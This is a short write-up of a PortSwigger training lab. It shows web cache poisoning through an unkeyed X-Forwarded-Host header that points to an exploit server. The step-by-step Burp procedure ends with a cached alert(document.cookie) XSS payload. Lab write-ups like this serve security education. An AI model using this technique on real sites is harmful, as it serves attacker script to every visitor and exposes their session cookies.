# 🧨 Web Cache Poisoning via Unkeyed Header – PortSwigger Lab (Writeup by vgod)

**Lab:** Web cache poisoning with an unkeyed header  
**Difficulty:** Practitioner  
**Author:** `vgod`  
**Tags:** `web-cache-poisoning`, `xss`, `unkeyed-headers`, `bugbounty`, `portswigger-labs`

---

## 🧪 What I Did

1. Opened the lab in a browser and intercepted the homepage request using **Burp Suite**.
2. Sent the homepage request to **Repeater** for testing.
3. Injected the header:
   ```http
   X-Forwarded-Host: bing.com
   ```
4. Observed that the response reflected the value and returned `X-Cache: hit`, confirming it was cached.
5. Opened `/resources/tracking.js` in the browser, copied the JS file's content, and pasted it into the **exploit server**.
6. Replaced `bing.com` with the **exploit server’s link** that hosts the JavaScript payload:
   ```http
   X-Forwarded-Host: your-exploit-server.exploit-server.net
   ```
7. Repeated the request until the response showed `X-Cache: hit` again.
8. Opened the poisoned homepage in the browser → 💥 **`alert(document.cookie)`** executed.

---

## ✅ Result

Successfully poisoned the cache using the unkeyed `X-Forwarded-Host` header. The malicious JS hosted on the exploit server was served to future users — triggering **stored XSS**.

---

## 💡 Key Takeaways

- Always test headers like `X-Forwarded-Host` for cache poisoning.
- Cache poisoning can store malicious content affecting all users.
- Using exploit server with your payload is a great trick for hosting custom JS.

---

🕶️ Written by `vgod` – chasing bugs, writing payloads, breaking cache ☠️  
Follow for more writeups and real-world hacking notes.
